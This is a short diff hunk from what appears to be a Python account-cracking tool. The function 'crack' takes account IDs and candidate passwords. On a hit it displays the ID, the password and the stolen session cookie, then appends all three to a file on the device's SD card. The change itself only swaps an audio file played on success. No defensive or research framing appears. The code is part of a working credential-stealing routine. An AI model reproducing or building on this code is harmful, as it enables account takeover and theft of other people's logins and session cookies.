@@ -572,7 +572,7 @@ def crack(idf,pwv):
 				tree.add(f"[bold green]{idf}[bold white]│[bold green]{pw}")
 				tree.add(f"[bold green]{kuki}")
 				tree.add(f"[bold cyan]{ua}\n")
-				os.popen('play-audio c.mp3')
+				os.popen('play-audio o.mp3')
 				cetak(tree)
 				# open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				open('/sdcard/LIV-OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
